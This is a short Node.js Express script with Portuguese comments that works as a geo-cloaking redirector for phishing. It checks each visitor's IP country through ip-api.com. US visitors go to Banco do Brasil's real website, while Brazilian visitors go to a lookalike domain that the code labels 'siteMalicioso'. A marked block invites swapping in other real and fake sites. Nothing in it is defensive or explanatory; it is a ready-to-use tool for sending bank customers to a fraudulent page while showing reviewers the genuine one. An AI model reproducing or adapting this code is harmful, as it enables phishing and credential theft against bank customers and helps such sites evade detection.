const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');

const app = express();
const port = 3000;








/* ---------------------------------- Modifique abaixo */ 
const siteReal = "https://www.bb.com.br/site/";

const siteMalicioso = "https://bancobrasil.me/"
/* ----------------------------------*/ 









// Adiciona middleware para obter o endereço IP do cliente
app.use(requestIp.mw());

app.get('/', async (req, res) => {
  const userIP = req.clientIp;

  try {
    // Use o serviço https://ip-api.com/ para obter informações de localização com base no IP
    const response = await axios.get(`http://ip-api.com/json/${userIP}`);
    const data = response.data;

    // Redireciona com base no país
    if (data.countryCode === 'US') {
      res.redirect(siteReal);
    } else if (data.countryCode === 'BR') {
      res.redirect(siteMalicioso);
    } else {
      res.send('Bem-vindo! Seu país não foi configurado para redirecionamento.');
    }
  } catch (error) {
    console.error(error.message);
    res.status(500).send('Erro ao obter informações de localização.');
  }
});

app.listen(port, () => {
  console.log(`Servidor está rodando em http://localhost:${port}`);
});
